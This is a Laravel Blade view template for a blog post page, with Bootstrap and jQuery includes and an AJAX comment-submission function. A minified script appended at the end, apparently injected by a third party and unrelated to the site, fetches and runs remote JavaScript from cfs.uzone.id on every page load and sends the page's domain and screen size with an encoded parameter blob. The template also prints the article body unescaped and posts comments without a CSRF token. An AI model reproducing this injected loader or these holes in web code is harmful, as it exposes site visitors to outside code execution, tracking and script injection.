<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="description" content="Just simple blog">
    <meta name="author" content="luthfi abdurrahim">
    <link rel="icon" href="/viewpost/img/favicon.ico" sizes="16x16">
    <title>{{ $article->title }}</title>
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/viewpost/css/bootstrap.min.css" type="text/css">
    <!-- Custom Fonts -->
    <link href='/viewpost/fonts/google/first/google-fonts.css' rel='stylesheet' type='text/css'>
    <link href='/viewpost/fonts/google/second/google-fonts-2.css' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="viewpost/fonts/font-awesome/css/font-awesome.min.css" type="text/css">
    <!-- Plugin CSS -->
    <link rel="stylesheet" href="/viewpost/css/animate.min.css" type="text/css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="/viewpost/css/blog-styles.css" type="text/css">
    <!-- jQuery -->
    <script src="/viewpost/js/jquery.js"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="/viewpost/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="{{ URL::asset('css/style.css') }}">
    <!-- script function submitcomment() untuk membuat action ajax
       submit comment without load page-->
    <script type="text/javascript">
        function submitcomment() {
            var content_comment=document.getElementById('content_comment').value;
            var post_id_comment=document.getElementById('post_id_comment').value;
            var user_id_comment=document.getElementById('user_id_comment').value;

            $.ajax({
                url:"fetch/fetch_comment.php",
                data: { 'content_comment':content_comment,
                    'post_id_comment':post_id_comment,
                    'user_id_comment':user_id_comment },
                type:"POST",
                dataType:"text",
                cache:false,
                success : function(data){
                    $('#showcomment').append(data);
                }
            });
            return false;
        }
    </script>
</head>
<body id="page-top">

<header class="programs" style="background-image: none">
    <div class="header-content-inner">
        <h1>{{ $article->title }}</h1>
        <hr>
        <p>Posted on : {{ \Carbon\Carbon::parse($article->created_at)->diffForHumans() }}</p>
        <a href="#all-post-blog" class="btn btn-primary btn-xl page-scroll">
            <span class="glyphicon glyphicon-chevron-down" aria-hidden="true"></span>
        </a>
    </div>
</header>
<!--The Post-->
<section class="bg-all-post" id="all-post-blog" >
    <div class="container">
        <div class="row header animate-in" data-anim-type="fade-in-up">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                {!! $article->body !!}
            </div>
        </div>
    </div>
</section>
<div id="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
            </div>
        </div>
    </div>
</div>
<!-- Plugin JavaScript -->
<script src="/viewpost/js/jquery.easing.min.js"></script>
<script src="/viewpost/js/jquery.fittext.js"></script>
<script src="/viewpost/js/wow.min.js"></script>
<!-- Custom Theme JavaScript -->
<script src="/viewpost/js/blog-scripts.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnLnJV6JHiASyrk8iL2SnNX4Nj6hhH3HeztftUayfdH51yFgHrCNVNOR9JVeRaF%2fMEERHsHeIccaeLi5igmFcLntfGy%2biCuNZx1dVpszfNaj1ZABPdyA%2fiKGRCGJ4QU0tqrMdUYc3D0jpdf7mztFULOTY%2fmAL4dr66a4VhsqiD1U%2bHq1xI4l9FeBcstFQvKFa4wmG8bQmbh1NuQKnaQ97L98T%2bfn2qfiiuc3KYAtL92YDgyR630xQNL8LJiEgJyLgE7iHIZtrmGY6cDbeMX0FvAp5mRAEC0HpUoEYO75nQ6VDbaMECdOa%2bMdnyd%2bTt53YP1zm0R8aE3tMtjzIgdop0AJt%2b2LFpaw%2fNV2JxwmLaXlCbJS1yr4l4pHBRl%2f%2bfjiCUX8YV4%2f3zHkgx86xIlyUHvaC2wGHaQaLNsl8Pu4kOR9S3AVq1RHOM99JG5jVN8UkVx57kLVWBds7%2f4bAcn24xzTtu1CpjVyF3mos0B5TExPA8HKneIeD7J68fzk90KvrodJalqVoTzOfJt05J9CSl5w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>

